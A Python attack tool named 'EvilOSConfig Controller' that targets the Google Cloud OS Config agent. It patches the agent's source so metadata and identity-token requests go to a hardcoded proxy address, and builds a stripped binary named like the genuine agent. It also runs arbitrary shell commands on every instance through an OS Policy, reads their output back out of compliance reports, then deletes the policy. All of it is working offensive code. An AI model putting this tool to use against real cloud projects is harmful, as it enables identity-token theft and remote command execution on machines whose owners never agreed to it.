#!/usr/bin/env python3
"""
EvilOSConfig Controller
- bake: Hardcode metadata proxy address into the agent source
- compile: Build the agent binary (with optional --trim to remove heavy deps)
- runcmd: Send a command via OS Policy ExecResource and retrieve results
"""

import argparse
import subprocess
import json
import sys
import time
import re
import os
import shutil
import textwrap
import yaml

AGENT_DIR = os.path.dirname(os.path.abspath(__file__))
AGENTCONFIG_PATH = os.path.join(AGENT_DIR, "agentconfig/agentconfig.go")

# Files/dirs to remove or stub for --trim
TRIM_TARGETS = {
    # scalibr (sqlite, vuln scanner) — biggest offender
    "packages/scalibr.go": "stub",
    # inventory pulls in scalibr, packages, heavy proto deps
    "inventory/inventory.go": "stub_inventory",
}

# Heavy go.mod deps to remove with --trim
TRIM_DEPS = [
    "github.com/google/osv-scalibr",
    "cos.googlesource.com/cos/tools.git",
]

# ── bake ──────────────────────────────────────────────────────────────

def cmd_bake(args):
    with open(AGENTCONFIG_PATH, 'r') as f:
        content = f.read()

    proxy_addr = args.proxy_host

    changes = 0

    # Patch 1: getMetadata() — hardcode host
    old_pattern = r'host := os\.Getenv\(metadataHostEnv\)'
    if re.search(old_pattern, content):
        content = re.sub(old_pattern, f'host := "{proxy_addr}" // BAKED', content)
        changes += 1
    elif 'host := "' in content and 'BAKED' in content:
        content = re.sub(r'host := "[^"]*" // BAKED', f'host := "{proxy_addr}" // BAKED', content)
        changes += 1

    # Patch 2: IDToken() — replace metadata.Get() with our getMetadata()
    # This is needed because metadata.Get() uses its own GCE_METADATA_HOST check
    old_idtoken = r'data, err := metadata\.Get\(IdentityTokenPath\)'
    new_idtoken = f'raw, _, err := getMetadata(IdentityTokenPath)\n\tdata := string(raw) // BAKED'
    if re.search(old_idtoken, content):
        content = re.sub(old_idtoken, new_idtoken, content)
        # Comment out the now-unused metadata import
        content = re.sub(
            r'\t"cloud\.google\.com/go/compute/metadata"\n',
            '\t// "cloud.google.com/go/compute/metadata" // BAKED\n',
            content
        )
        changes += 1
    elif '// BAKED' in content and 'data := string(raw)' in content:
        changes += 1  # already patched

    if changes == 0:
        print("[!] Could not find patterns to patch in agentconfig.go", file=sys.stderr)
        sys.exit(1)

    with open(AGENTCONFIG_PATH, 'w') as f:
        f.write(content)

    print(f"[+] Baked into {AGENTCONFIG_PATH}:")
    print(f"    Metadata proxy: {proxy_addr}")
    print(f"    Patches applied: {changes}")


def cmd_unbake(args):
    with open(AGENTCONFIG_PATH, 'r') as f:
        content = f.read()

    # Revert getMetadata host
    content = re.sub(
        r'host := "[^"]*" // BAKED',
        'host := os.Getenv(metadataHostEnv)',
        content
    )

    # Revert IDToken
    content = re.sub(
        r'raw, _, err := getMetadata\(IdentityTokenPath\)\n\tdata := string\(raw\) // BAKED',
        'data, err := metadata.Get(IdentityTokenPath)',
        content
    )

    # Restore metadata import
    content = re.sub(
        r'\t// "cloud\.google\.com/go/compute/metadata" // BAKED\n',
        '\t"cloud.google.com/go/compute/metadata"\n',
        content
    )

    with open(AGENTCONFIG_PATH, 'w') as f:
        f.write(content)

    print("[+] Restored original metadata host and IDToken")


# ── compile ───────────────────────────────────────────────────────────

SCALIBR_STUB = '''\
package packages

import (
\t"context"
\t"github.com/GoogleCloudPlatform/osconfig/osinfo"
)

type scalibrInstalledPackagesProvider struct {
\textractors      []string
\tosinfoProvider  osinfo.Provider
}

func (p scalibrInstalledPackagesProvider) GetInstalledPackages(ctx context.Context) (Packages, error) {
\treturn Packages{}, nil
}
'''

INVENTORY_STUB = '''\
package inventory

import (
\t"context"
\tagentendpointpb "cloud.google.com/go/osconfig/agentendpoint/apiv1/agentendpointpb"
)

type Provider interface {
\tGetInventory(ctx context.Context) (*agentendpointpb.Inventory, *agentendpointpb.VmInventory)
}

type defaultProvider struct{}

func NewProvider() Provider { return &defaultProvider{} }

func (p *defaultProvider) GetInventory(ctx context.Context) (*agentendpointpb.Inventory, *agentendpointpb.VmInventory) {
\treturn &agentendpointpb.Inventory{}, &agentendpointpb.VmInventory{}
}
'''


def cmd_compile(args):
    output = args.output or "google_osconfig_agent"
    backups = {}

    if args.trim:
        print("[*] Trimming heavy dependencies...")

        # Backup and stub scalibr.go
        scalibr_path = os.path.join(AGENT_DIR, "packages/scalibr.go")
        if os.path.exists(scalibr_path):
            backups[scalibr_path] = open(scalibr_path).read()
            with open(scalibr_path, 'w') as f:
                f.write(SCALIBR_STUB)
            print("    [+] Stubbed packages/scalibr.go")

        # Remove unused go.mod deps
        for dep in TRIM_DEPS:
            subprocess.run(
                ["go", "mod", "edit", "-droprequire", dep],
                cwd=AGENT_DIR, capture_output=True
            )
            print(f"    [+] Dropped go.mod dep: {dep}")

        # Tidy
        print("    [*] Running go mod tidy...")
        result = subprocess.run(
            ["go", "mod", "tidy"],
            cwd=AGENT_DIR, capture_output=True, text=True
        )
        if result.returncode != 0:
            print(f"    [!] go mod tidy warnings (non-fatal):\n{result.stderr[:500]}")

    # Build
    env = os.environ.copy()
    env["CGO_ENABLED"] = "0"
    build_cmd = ["go", "build", "-o", output]

    if args.ldflags:
        build_cmd.extend(["-ldflags", args.ldflags])

    print(f"[*] Building {output}...")
    result = subprocess.run(
        build_cmd, cwd=AGENT_DIR, env=env, capture_output=True, text=True, timeout=300
    )

    if result.returncode != 0:
        print(f"[!] Build failed:\n{result.stderr}", file=sys.stderr)
        # Restore backups
        for path, content in backups.items():
            with open(path, 'w') as f:
                f.write(content)
        sys.exit(1)

    # Restore backups (keep source clean)
    for path, content in backups.items():
        with open(path, 'w') as f:
            f.write(content)

    # Also restore go.mod if trimmed
    if args.trim:
        subprocess.run(["git", "checkout", "go.mod", "go.sum"], cwd=AGENT_DIR, capture_output=True)
        print("    [+] Restored go.mod/go.sum")

    binary_path = os.path.join(AGENT_DIR, output)
    size_mb = os.path.getsize(binary_path) / (1024 * 1024)
    print(f"[+] Built: {binary_path} ({size_mb:.1f} MB)")


# ── runcmd ────────────────────────────────────────────────────────────

def cmd_runcmd(args):
    zone = args.zone
    policy_id = f"evilosconfig-cmd-{int(time.time())}"
    project = get_project()

    # Resolve instance name → numeric ID for the report API
    id_result = subprocess.run([
        "gcloud", "compute", "instances", "describe", args.instance,
        "--zone", zone, "--format", "value(id)"
    ], capture_output=True, text=True)
    if id_result.returncode != 0:
        print(f"[!] Cannot resolve instance ID: {id_result.stderr}", file=sys.stderr)
        sys.exit(1)
    instance = id_result.stdout.strip()

    # Put command in enforce step — stdout lands in the compliance report's errorMessage.
    # Validate returns 101 (needs enforcement), enforce runs the command.
    policy = {
        "osPolicies": [{
            "id": policy_id,
            "mode": "ENFORCEMENT",
            "resourceGroups": [{
                "resources": [{
                    "id": "exec",
                    "exec": {
                        "validate": {
                            "interpreter": "SHELL",
                            "script": "exit 101\n"
                        },
                        "enforce": {
                            "interpreter": "SHELL",
                            "script": f"{args.command}\nexit 0\n"
                        }
                    }
                }]
            }]
        }],
        "instanceFilter": {"all": True},
        "rollout": {
            "disruptionBudget": {"fixed": 1},
            "minWaitDuration": "0s"
        }
    }

    policy_file = f"/tmp/{policy_id}.yaml"
    with open(policy_file, 'w') as f:
        yaml.dump(policy, f, default_flow_style=False)

    print(f"[*] Deploying OS Policy: {policy_id}")
    print(f"[*] Command: {args.command}")

    result = subprocess.run([
        "gcloud", "compute", "os-config", "os-policy-assignments", "create",
        policy_id,
        "--location", zone,
        "--file", policy_file,
        "--quiet"
    ], capture_output=True, text=True, timeout=120)

    if result.returncode != 0:
        print(f"[!] Failed to create policy:\n{result.stderr}", file=sys.stderr)
        os.unlink(policy_file)
        sys.exit(1)

    print("[+] Policy deployed. Waiting for execution...")

    # Poll the compliance report API for output
    # stdout appears in errorMessage of the DESIRED_STATE_ENFORCEMENT step
    token_cmd = ["gcloud", "auth", "print-access-token"]
    report_url = (
        f"https://osconfig.googleapis.com/v1/projects/{project}"
        f"/locations/{zone}/instances/{instance}"
        f"/osPolicyAssignments/{policy_id}/report"
    )

    output_found = False
    deadline = time.time() + args.timeout
    while time.time() < deadline:
        time.sleep(args.poll_interval)

        token_result = subprocess.run(token_cmd, capture_output=True, text=True)
        if token_result.returncode != 0:
            continue
        token = token_result.stdout.strip()

        import urllib.request
        req = urllib.request.Request(report_url)
        req.add_header("Authorization", f"Bearer {token}")
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                report = json.loads(resp.read())
        except Exception:
            continue

        # Extract output from compliance report
        for policy_compliance in report.get("osPolicyCompliances", []):
            for resource in policy_compliance.get("osPolicyResourceCompliances", []):
                for step in resource.get("configSteps", []):
                    if step.get("type") == "DESIRED_STATE_ENFORCEMENT":
                        msg = step.get("errorMessage", "")
                        if msg:
                            # Parse stdout from: "...stdout: <output>\n, stderr: <err>"
                            stdout_match = re.search(r'stdout: (.*?)(?:, stderr:|$)', msg, re.DOTALL)
                            stderr_match = re.search(r'stderr: (.*?)$', msg, re.DOTALL)
                            stdout = stdout_match.group(1).strip() if stdout_match else ""
                            stderr = stderr_match.group(1).strip() if stderr_match else ""

                            if stdout:
                                print(stdout)
                            if stderr:
                                print(stderr, file=sys.stderr)
                            output_found = True
                            break
                if output_found:
                    break
            if output_found:
                break
        if output_found:
            break

    if not output_found:
        print("[!] Timed out waiting for output.", file=sys.stderr)

    # Cleanup
    if not args.no_cleanup:
        subprocess.run([
            "gcloud", "compute", "os-config", "os-policy-assignments", "delete",
            policy_id, "--location", zone, "--quiet", "--async"
        ], capture_output=True, text=True)

    os.unlink(policy_file)


def get_project():
    result = subprocess.run(
        ["gcloud", "config", "get-value", "project"],
        capture_output=True, text=True
    )
    return result.stdout.strip()


# ── main ──────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description='EvilOSConfig Controller',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
        examples:
          %(prog)s bake 34.56.78.90:8080
          %(prog)s compile --trim -o agent
          %(prog)s runcmd -z us-central1-a "id && hostname"
          %(prog)s unbake
        """)
    )
    sub = parser.add_subparsers(dest='command', required=True)

    # bake
    bake = sub.add_parser('bake', help='Hardcode metadata proxy address into agent source')
    bake.add_argument('proxy_host', help='Metadata proxy address (e.g., 34.56.78.90:8080)')
    bake.set_defaults(func=cmd_bake)

    # unbake
    unbake = sub.add_parser('unbake', help='Restore original env-var-based metadata host')
    unbake.set_defaults(func=cmd_unbake)

    # compile
    comp = sub.add_parser('compile', help='Build the agent binary')
    comp.add_argument('-o', '--output', default='google_osconfig_agent', help='Output binary name')
    comp.add_argument('--trim', action='store_true', help='Remove heavy deps (scalibr, sqlite) for smaller binary')
    comp.add_argument('--ldflags', default='-s -w', help='Go ldflags (default: -s -w to strip debug info)')
    comp.set_defaults(func=cmd_compile)

    # runcmd
    run = sub.add_parser('runcmd', help='Send a command via OS Policy ExecResource')
    run.add_argument('command', help='Shell command to execute')
    run.add_argument('-i', '--instance', default='osconfig-token-proxy', help='GCE instance name (default: osconfig-token-proxy)')
    run.add_argument('-z', '--zone', default='us-central1-a', help='GCE zone')
    run.add_argument('--timeout', type=int, default=120, help='Timeout in seconds (default: 120)')
    run.add_argument('--poll-interval', type=int, default=10, help='Poll interval in seconds (default: 10)')
    run.add_argument('--no-cleanup', action='store_true', help='Do not delete the OS Policy after execution')
    run.set_defaults(func=cmd_runcmd)

    args = parser.parse_args()
    args.func(args)


if __name__ == '__main__':
    main()
